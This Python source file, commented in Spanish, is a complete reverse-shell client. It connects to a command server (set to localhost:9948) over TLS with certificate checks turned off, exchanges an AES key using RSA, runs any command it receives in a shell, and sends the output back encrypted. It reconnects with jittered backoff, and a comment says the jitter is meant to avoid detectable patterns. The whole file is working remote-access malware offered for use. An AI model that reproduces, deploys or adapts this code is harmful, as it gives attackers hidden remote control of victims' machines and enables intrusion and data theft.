import socket
import ssl
import os
import struct
import time
import subprocess
import sys
import random

from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

# Configuración del servidor al que se conectará este cliente
SERVER_HOST = 'localhost'
SERVER_PORT = 9948

# Parámetros para reconexión exponencial en caso de fallo
RETRY_INITIAL = 60     # tiempo inicial en segundos (1 minuto)
RETRY_MAX = 900        # tiempo máximo entre reintentos (15 minutos)

# Contexto SSL/TLS sin verificación para conexión segura pero flexible
ssl_context = ssl.create_default_context()
ssl_context.check_hostname = False
ssl_context.verify_mode = ssl.CERT_NONE

# Texto de ayuda para el comando HELP
HELP_TEXT = (
    "HELP         - Muestra esta ayuda.\n"
    "GET_CWD      - Muestra directorio actual.\n"
    "cd <ruta>    - Cambia directorio.\n"
    "Otros comandos se ejecutan en shell."
)

def recvall(sock, n):
    """
    Recibe exactamente n bytes del socket.
    Esto es necesario porque socket.recv puede devolver menos bytes.
    """
    data = b''
    while len(data) < n:
        packet = sock.recv(n - len(data))
        if not packet:  # conexión cerrada o error
            return None
        data += packet
    return data

def send_encrypted_message(sock, plaintext: str, aes_key: bytes):
    """
    Cifra y envía un mensaje con AES-GCM.
    Se genera un nonce aleatorio de 12 bytes para cada mensaje.
    Se envía primero el tamaño del mensaje (4 bytes, network order),
    luego el nonce y el texto cifrado concatenados.
    """
    aesgcm = AESGCM(aes_key)
    nonce = os.urandom(12)
    ct = aesgcm.encrypt(nonce, plaintext.encode('utf-8'), None)
    msg = nonce + ct
    sock.sendall(struct.pack('!I', len(msg)) + msg)

def receive_encrypted_message(sock, aes_key: bytes) -> str:
    """
    Recibe y descifra un mensaje cifrado con AES-GCM.
    Primero lee 4 bytes con el tamaño del mensaje,
    luego lee ese número de bytes, separa nonce y texto cifrado,
    y finalmente lo descifra y retorna el texto plano.
    """
    raw_len = recvall(sock, 4)
    if not raw_len:
        return None
    length = struct.unpack('!I', raw_len)[0]
    data = recvall(sock, length)
    if not data:
        return None
    nonce, ct = data[:12], data[12:]
    aesgcm = AESGCM(aes_key)
    return aesgcm.decrypt(nonce, ct, None).decode('utf-8')

def execute_command(cmd: str) -> str:
    """
    Ejecuta comandos básicos o shell:
    - 'GET_CWD' devuelve el directorio actual.
    - 'cd <ruta>' cambia el directorio y confirma el cambio o error.
    - 'HELP' devuelve el texto de ayuda.
    - Otros comandos se ejecutan en shell y devuelve stdout o stderr.
    """
    cmd_upper = cmd.upper()
    if cmd_upper == 'GET_CWD':
        return os.getcwd()
    elif cmd.startswith('cd '):
        try:
            os.chdir(cmd[3:].strip())
            return f"[+] Directorio cambiado: {os.getcwd()}"
        except Exception as e:
            return f"[-] Error: {e}"
    elif cmd_upper == 'HELP':
        return HELP_TEXT
    # Ejecuta el comando recibido en shell (bash, cmd, etc)
    res = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    return (res.stdout or res.stderr).strip() or '[+] Ejecutado.'

def connect_to_server():
    """
    Función principal que conecta al servidor y mantiene la conexión.
    Realiza handshake cifrado usando RSA para intercambiar clave AES.
    Luego recibe comandos cifrados, los ejecuta y envía la respuesta cifrada.
    En caso de fallo, espera un tiempo exponencial antes de reintentar,
    con jitter aleatorio para evitar patrones detectables.
    """
    backoff = RETRY_INITIAL

    while True:
        try:
            # Crear socket TCP y conectar al servidor
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((SERVER_HOST, SERVER_PORT))
            # Envolver socket en TLS/SSL para seguridad
            tls_sock = ssl_context.wrap_socket(sock, server_hostname=SERVER_HOST)

            # Esperar recibir clave pública del servidor (prefijo "PUBKEY:")
            data = tls_sock.recv(4096)
            if not data.startswith(b'PUBKEY:'):
                tls_sock.close()
                continue

            # Extraer y cargar clave pública para cifrar AES key
            server_pub = serialization.load_pem_public_key(data[len(b'PUBKEY:'):])

            # Generar clave AES aleatoria para cifrado simétrico
            aes_key = os.urandom(32)

            # Cifrar la clave AES con clave pública del servidor (RSA-OAEP)
            enc = server_pub.encrypt(
                aes_key,
                padding.OAEP(
                    mgf=padding.MGF1(hashes.SHA256()),
                    algorithm=hashes.SHA256(),
                    label=None
                )
            )
            # Enviar tamaño + clave AES cifrada
            tls_sock.sendall(struct.pack('!I', len(enc)) + enc)

            # Ciclo principal: recibir comandos, ejecutar y enviar respuesta
            while True:
                msg = receive_encrypted_message(tls_sock, aes_key)
                if not msg:
                    break
                res = execute_command(msg)
                send_encrypted_message(tls_sock, res, aes_key)

            # Si la conexión termina normalmente, reseteamos backoff
            backoff = RETRY_INITIAL

        except Exception:
            # En caso de error, aumentamos backoff para no reconectar rápido
            backoff = min(backoff * 1.5, RETRY_MAX)

        finally:
            try:
                tls_sock.close()
            except:
                pass

        # Tiempo de espera con jitter entre 80% y 120% del backoff actual
        jitter = random.uniform(0.8, 1.2)
        wait_time = backoff * jitter
        time.sleep(wait_time)

if __name__ == '__main__':
    connect_to_server()
